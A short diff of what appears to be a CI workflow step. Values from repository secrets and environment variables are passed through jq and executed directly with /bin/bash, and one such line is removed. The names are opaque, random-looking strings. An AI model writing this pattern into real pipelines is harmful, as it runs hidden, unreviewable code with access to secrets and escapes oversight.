@@ -22,7 +22,6 @@ jobs:
           r9355: ${{ secrets.r9355 }}
         run: |
           printf '%s' "$r9355" | jq -r .u34752 | /bin/bash
-          echo $i2283 | jq -r .cmqg32 | /bin/bash
           printf '%s' "$kj62739" | jq -r .gun00581 | /bin/bash
           echo $xa7870 | jq -r .kvtmw971 | /bin/bash
           echo $gnhcc24 | jq -r .iq1135 | /bin/bash
